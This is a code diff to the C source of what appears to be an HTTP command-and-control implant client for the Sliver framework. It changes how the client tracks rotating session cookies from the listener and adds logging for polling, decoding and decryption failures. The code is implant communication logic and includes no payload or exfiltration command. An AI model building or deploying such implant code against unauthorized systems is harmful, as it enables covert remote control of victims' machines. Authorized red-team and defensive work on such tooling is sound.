@@ -219,8 +219,8 @@ int sliver_http_session_exchange(sliver_http_session_t *s, const char *method,
     if (status_out != NULL && header_len >= 12 && memcmp(buf, "HTTP/1.", 7) == 0) {
       *status_out = (buf[9] - '0') * 100 + (buf[10] - '0') * 10 + (buf[11] - '0');
     }
-    /* Remember the session cookie the server set (name is random per response). */
-    if (s->have_cookie == 0) {
+    /* Always track the latest cookie: the listener rotates the NAME on every\n     * response (getCookieName picks from the profile), only the value is\n     * stable. */
+    {
       const char *hdr = (const char *)buf;
       const char *cookie = strstr(hdr, "Set-Cookie: ");
       if (cookie != NULL && (size_t)(cookie - hdr) < header_len) {
@@ -388,6 +388,7 @@ int sliver_http_session_recv(sliver_http_session_t *s, sliver_buf_t *env_out) {
   if (rc != 0) {
     return -1;
   }
+  LOG_DEBUG("http-c2: poll status %d (%u bytes)", status, (unsigned)resp_len);
   if (status == 204) {
     free(resp);
     return 1; /* idle: nothing to do, keep the loop alive */
@@ -408,11 +409,15 @@ int sliver_http_session_recv(sliver_http_session_t *s, sliver_buf_t *env_out) {
     size_t decoded_len = 0;
     if (sliver_encoder_decode(SLIVER_ENCODER_NOP, resp, resp_len, &decoded, &decoded_len) !=
         0) {
+      LOG_WARN("http-c2: poll body failed to decode");
       free(resp);
       return -1;
     }
     free(resp);
     rc = sliver_cipher_decrypt(s->key, decoded, decoded_len, &env_out->data, &env_out->len);
+    if (rc != 0) {
+      LOG_WARN("http-c2: poll body failed to decrypt (%u bytes)", (unsigned)decoded_len);
+    }
     free(decoded);
     return rc == 0 ? 0 : -1;
   }
